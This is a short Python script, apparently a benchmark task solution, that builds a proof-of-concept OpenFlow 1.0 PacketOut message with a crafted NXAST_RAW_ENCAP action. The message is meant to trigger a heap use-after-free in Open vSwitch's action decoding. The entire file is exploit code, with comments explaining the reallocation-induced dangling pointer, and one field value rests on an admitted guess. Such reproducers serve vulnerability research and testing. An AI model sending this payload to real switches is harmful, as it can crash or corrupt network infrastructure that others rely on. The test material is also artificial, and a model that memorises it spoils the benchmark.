import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in OVS RAW_ENCAP decoding.
        The PoC is an OpenFlow 1.0 PacketOut message containing an NXAST_RAW_ENCAP action.
        """
        
        # OpenFlow 1.0 Header (8 bytes)
        # Version: 0x01 (OF 1.0)
        # Type: 0x0d (OFPT_PACKET_OUT = 13)
        # Length: 0x0048 (72 bytes)
        # XID: 0x00000000
        of_header = struct.pack('!BBHI', 1, 13, 72, 0)
        
        # PacketOut Body (8 bytes)
        # Buffer ID: 0xffffffff (No Buffer / OFP_NO_BUFFER)
        # In Port: 0x0000 (OFPP_NONE or 0)
        # Actions Length: 56 bytes (0x0038)
        #   - This accounts for the NXAST_RAW_ENCAP action (16 bytes header + 40 bytes prop)
        packet_out_header = struct.pack('!IHH', 0xffffffff, 0, 56)
        
        # NXAST_RAW_ENCAP Action Header (16 bytes)
        # Type: 0xffff (OFPAT_VENDOR)
        # Length: 56 (0x0038)
        # Vendor: 0x00002320 (Nicira / NX_VENDOR_ID)
        # Subtype: 46 (NXAST_RAW_ENCAP)
        # Padding: 6 bytes (to align to 8 bytes)
        # Format: Type(H), Length(H), Vendor(I), Subtype(H), Pad(6x)
        action_header = struct.pack('!HHIH6x', 0xffff, 56, 0x00002320, 46)
        
        # Property (40 bytes)
        # The vulnerability is triggered during decode_ed_prop which appends property data
        # to the ofpbuf. If the buffer reallocates, the 'encap' pointer held by 
        # decode_NXAST_RAW_ENCAP becomes dangling.
        # We construct a property to pass validation and trigger data writing.
        # Type: 1 (Assuming 1 is a valid property type, typically NX_ENCAP_IP or similar)
        # Length: 40 bytes (0x0028)
        # Value: 36 bytes of data (Length - 4)
        prop_type = 1
        prop_len = 40
        prop_val_len = prop_len - 4
        prop = struct.pack('!HH', prop_type, prop_len) + b'\x00' * prop_val_len
        
        # Concatenate all parts to form the PoC
        return of_header + packet_out_header + action_header + prop